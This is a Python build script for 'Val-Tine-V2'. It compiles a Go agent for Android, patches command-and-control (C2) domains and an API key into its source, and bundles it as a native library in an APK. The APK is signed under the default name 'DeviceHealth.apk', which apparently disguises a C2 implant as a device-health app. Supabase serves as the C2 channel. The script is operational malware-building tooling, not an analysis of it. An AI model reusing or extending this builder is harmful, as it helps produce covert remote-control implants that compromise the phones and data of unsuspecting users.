#!/usr/bin/env python3
"""
build_android.py — Android APK builder for Val-Tine-V2

Compiles the Go agent for Android arm64, injects C2 config,
packages it into an APK via Gradle, and signs it.

Requirements:
  - Go 1.21+ with Android NDK (for CGO) or pure Go cross-compilation
  - Android SDK with build-tools, platform 34
  - Gradle 8.x (or uses the wrapper)
  - Java 17+ (for Gradle/Android build)

Usage:
  python3 build_android.py
  python3 build_android.py --domain abc.supabase.co --apikey eyJ...
"""

import argparse
import os
import re
import shutil
import subprocess
import sys
import tempfile

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
ANDROID_DIR = os.path.join(SCRIPT_DIR, "android")
AGENT_DIR = os.path.join(ANDROID_DIR, "agent")
AGENT_SRC = os.path.join(AGENT_DIR, "main.go")
APP_DIR = os.path.join(ANDROID_DIR, "app")

# Architectures to build
ARCHS = {
    "arm64": {"GOARCH": "arm64", "abi": "arm64-v8a"},
    "arm":   {"GOARCH": "arm",   "abi": "armeabi-v7a"},
    "x86_64": {"GOARCH": "amd64", "abi": "x86_64"},
}

DEFAULT_ARCHS = ["arm64"]


def log(msg, tag="INFO"):
    colors = {"OK": "\033[92m", "ERR": "\033[91m", "WARN": "\033[93m", "INFO": "\033[94m"}
    reset = "\033[0m"
    c = colors.get(tag, "")
    print(f"  {c}[{tag}]{reset} {msg}")


def run(cmd, cwd=None, env=None, check=True):
    """Run a shell command and return output."""
    merged_env = os.environ.copy()
    if env:
        merged_env.update(env)
    result = subprocess.run(
        cmd, shell=True, cwd=cwd, env=merged_env,
        capture_output=True, text=True
    )
    if check and result.returncode != 0:
        log(f"Command failed: {cmd}", "ERR")
        if result.stderr:
            log(result.stderr.strip(), "ERR")
        sys.exit(1)
    return result


def check_tools():
    """Verify required tools are available."""
    tools = {
        "go": "Go compiler (https://go.dev/dl/)",
        "java": "Java 17+ (https://adoptium.net/)",
    }
    missing = []
    for tool, desc in tools.items():
        if shutil.which(tool) is None:
            missing.append(f"  - {tool}: {desc}")

    if missing:
        log("Missing required tools:", "ERR")
        for m in missing:
            print(m)
        sys.exit(1)

    # Check for Android SDK
    android_home = os.environ.get("ANDROID_HOME") or os.environ.get("ANDROID_SDK_ROOT")
    if not android_home:
        # Try common locations
        candidates = [
            os.path.expanduser("~/Android/Sdk"),
            os.path.expanduser("~/Library/Android/sdk"),
            "C:\\Users\\{}\\AppData\\Local\\Android\\Sdk".format(os.environ.get("USERNAME", "")),
        ]
        for c in candidates:
            if os.path.isdir(c):
                android_home = c
                os.environ["ANDROID_HOME"] = c
                break

    if not android_home or not os.path.isdir(android_home):
        log("Android SDK not found. Set ANDROID_HOME environment variable.", "ERR")
        log("Download from: https://developer.android.com/studio#command-line-tools-only", "ERR")
        sys.exit(1)

    log(f"Android SDK: {android_home}", "OK")
    return android_home


def read_config_from_env():
    """Try to read C2 config from .env file."""
    env_file = os.path.join(SCRIPT_DIR, ".env")
    config = {}
    if os.path.exists(env_file):
        with open(env_file) as f:
            for line in f:
                line = line.strip()
                if "=" in line and not line.startswith("#"):
                    key, val = line.split("=", 1)
                    config[key.strip()] = val.strip().strip('"').strip("'")
    return config


def inject_config(source, domain1, domain2, apikey):
    """Replace placeholder values in Go source with actual C2 config."""
    replacements = {
        'PLACEHOLDER_C2_DOMAIN_1': domain1,
        'PLACEHOLDER_C2_DOMAIN_2': domain2 or "",
        'PLACEHOLDER_C2_APIKEY': apikey,
    }
    for placeholder, value in replacements.items():
        source = source.replace(placeholder, value)
    return source


def compile_agent(agent_src, output_path, goarch, env_extra=None):
    """Cross-compile the Go agent for Android."""
    env = {
        "GOOS": "android",
        "GOARCH": goarch,
        "CGO_ENABLED": "0",
    }
    if env_extra:
        env.update(env_extra)

    cmd = f'go build -trimpath -ldflags="-s -w" -o "{output_path}" "{agent_src}"'
    log(f"Compiling for android/{goarch}...")
    run(cmd, cwd=os.path.dirname(agent_src), env=env)

    size = os.path.getsize(output_path)
    log(f"Binary: {output_path} ({size // 1024} KB)", "OK")


def build_apk(android_dir, use_gradle_wrapper=True):
    """Build the APK using Gradle."""
    gradle_cmd = "./gradlew" if use_gradle_wrapper else "gradle"
    wrapper_path = os.path.join(android_dir, "gradlew")

    if use_gradle_wrapper and not os.path.exists(wrapper_path):
        # Generate gradle wrapper
        if shutil.which("gradle"):
            log("Generating Gradle wrapper...")
            run("gradle wrapper", cwd=android_dir)
        else:
            log("No Gradle wrapper found. Trying system Gradle...", "WARN")
            gradle_cmd = "gradle"
            if not shutil.which("gradle"):
                log("Gradle not found. Install Gradle or Android Studio.", "ERR")
                sys.exit(1)

    log("Building APK with Gradle...")
    run(f"{gradle_cmd} assembleRelease --no-daemon -q", cwd=android_dir)

    # Find output APK
    apk_path = os.path.join(
        android_dir, "app", "build", "outputs", "apk", "release", "app-release-unsigned.apk"
    )
    if not os.path.exists(apk_path):
        # Try debug build as fallback
        log("Release build not found, trying debug...", "WARN")
        run(f"{gradle_cmd} assembleDebug --no-daemon -q", cwd=android_dir)
        apk_path = os.path.join(
            android_dir, "app", "build", "outputs", "apk", "debug", "app-debug.apk"
        )

    if not os.path.exists(apk_path):
        log("APK build failed — no output found", "ERR")
        sys.exit(1)

    log(f"APK built: {apk_path}", "OK")
    return apk_path


def sign_apk(apk_path, output_path, android_home):
    """Sign and zipalign the APK."""
    # Find build-tools
    bt_dir = os.path.join(android_home, "build-tools")
    if not os.path.isdir(bt_dir):
        log("Android build-tools not found", "ERR")
        sys.exit(1)

    versions = sorted(os.listdir(bt_dir), reverse=True)
    if not versions:
        log("No build-tools versions installed", "ERR")
        sys.exit(1)

    bt = os.path.join(bt_dir, versions[0])
    zipalign = os.path.join(bt, "zipalign")
    apksigner = os.path.join(bt, "apksigner")

    # Generate a debug keystore if needed
    keystore = os.path.join(SCRIPT_DIR, "android-debug.keystore")
    if not os.path.exists(keystore):
        log("Generating debug keystore...")
        run(
            f'keytool -genkeypair -v -keystore "{keystore}" '
            f'-keyalg RSA -keysize 2048 -validity 10000 '
            f'-alias androiddebugkey -storepass android -keypass android '
            f'-dname "CN=Debug,OU=Dev,O=Dev,L=US,S=US,C=US"'
        )

    # Zipalign
    aligned = output_path + ".aligned"
    if os.path.exists(zipalign):
        log("Zipaligning APK...")
        run(f'"{zipalign}" -f 4 "{apk_path}" "{aligned}"')
    else:
        shutil.copy2(apk_path, aligned)
        log("zipalign not found, skipping alignment", "WARN")

    # Sign
    if os.path.exists(apksigner):
        log("Signing APK...")
        run(
            f'"{apksigner}" sign --ks "{keystore}" '
            f'--ks-pass pass:android --key-pass pass:android '
            f'--out "{output_path}" "{aligned}"'
        )
    else:
        # Fallback to jarsigner
        log("apksigner not found, using jarsigner...", "WARN")
        shutil.copy2(aligned, output_path)
        run(
            f'jarsigner -keystore "{keystore}" '
            f'-storepass android -keypass android '
            f'"{output_path}" androiddebugkey'
        )

    os.remove(aligned)
    size = os.path.getsize(output_path)
    log(f"Signed APK: {output_path} ({size // 1024} KB)", "OK")


def main():
    parser = argparse.ArgumentParser(description="Build Android APK agent")
    parser.add_argument("--domain", help="Primary Supabase domain (e.g. abc.supabase.co)")
    parser.add_argument("--domain2", help="Secondary Supabase domain (optional)")
    parser.add_argument("--apikey", help="Supabase anon/public API key")
    parser.add_argument("--arch", nargs="+", default=DEFAULT_ARCHS,
                        choices=list(ARCHS.keys()),
                        help="Target architectures (default: arm64)")
    parser.add_argument("--output", default="DeviceHealth.apk",
                        help="Output APK filename")
    parser.add_argument("--skip-apk", action="store_true",
                        help="Only compile Go binary, skip APK packaging")
    args = parser.parse_args()

    print()
    print("  ╔══════════════════════════════════════╗")
    print("  ║   Val-Tine Android Builder           ║")
    print("  ╚══════════════════════════════════════╝")
    print()

    # Read config
    env_config = read_config_from_env()
    domain1 = args.domain or env_config.get("VITE_SUPABASE_URL", "").replace("https://", "")
    domain2 = args.domain2 or env_config.get("VITE_SUPABASE_URL_2", "").replace("https://", "")
    apikey = args.apikey or env_config.get("VITE_SUPABASE_ANON_KEY", "")

    if not domain1 or not apikey:
        log("C2 config required. Provide via --domain/--apikey or .env file.", "ERR")
        log("Run setup.py first to generate .env, or pass flags directly.", "ERR")
        sys.exit(1)

    log(f"C2 Domain: {domain1}")
    if domain2:
        log(f"C2 Domain 2: {domain2}")

    # Check tools
    if not args.skip_apk:
        android_home = check_tools()
    else:
        # Just need Go
        if not shutil.which("go"):
            log("Go compiler not found", "ERR")
            sys.exit(1)

    # Read and patch agent source
    log("Reading agent source...")
    with open(AGENT_SRC, "r") as f:
        source = f.read()

    patched_source = inject_config(source, domain1, domain2, apikey)

    # Write patched source to temp file
    tmp_dir = tempfile.mkdtemp(prefix="valtine_android_")
    patched_src = os.path.join(tmp_dir, "main.go")
    with open(patched_src, "w") as f:
        f.write(patched_source)

    # Copy go.mod
    shutil.copy2(os.path.join(AGENT_DIR, "go.mod"), os.path.join(tmp_dir, "go.mod"))
    go_sum = os.path.join(AGENT_DIR, "go.sum")
    if os.path.exists(go_sum):
        shutil.copy2(go_sum, os.path.join(tmp_dir, "go.sum"))

    # Compile for each architecture
    for arch in args.arch:
        arch_info = ARCHS[arch]
        abi = arch_info["abi"]

        if args.skip_apk:
            output = os.path.join(SCRIPT_DIR, f"agent_{arch}")
            compile_agent(patched_src, output, arch_info["GOARCH"])
        else:
            # Output directly into jniLibs directory
            jni_dir = os.path.join(APP_DIR, "src", "main", "jniLibs", abi)
            os.makedirs(jni_dir, exist_ok=True)
            output = os.path.join(jni_dir, "libagent.so")
            compile_agent(patched_src, output, arch_info["GOARCH"])

    # Cleanup temp
    shutil.rmtree(tmp_dir, ignore_errors=True)

    if args.skip_apk:
        log("Go binaries compiled. Skipping APK build.", "OK")
        print()
        return

    # Build APK
    print()
    apk_path = build_apk(ANDROID_DIR)

    # Sign APK
    output_path = os.path.join(SCRIPT_DIR, args.output)
    sign_apk(apk_path, output_path, android_home)

    # Cleanup jniLibs (don't leave binaries in git)
    jniLibs_root = os.path.join(APP_DIR, "src", "main", "jniLibs")
    if os.path.isdir(jniLibs_root):
        shutil.rmtree(jniLibs_root)

    print()
    log("Build complete!", "OK")
    log(f"Output: {output_path}", "OK")
    print()
    print("  Install via: adb install " + args.output)
    print()


if __name__ == "__main__":
    main()
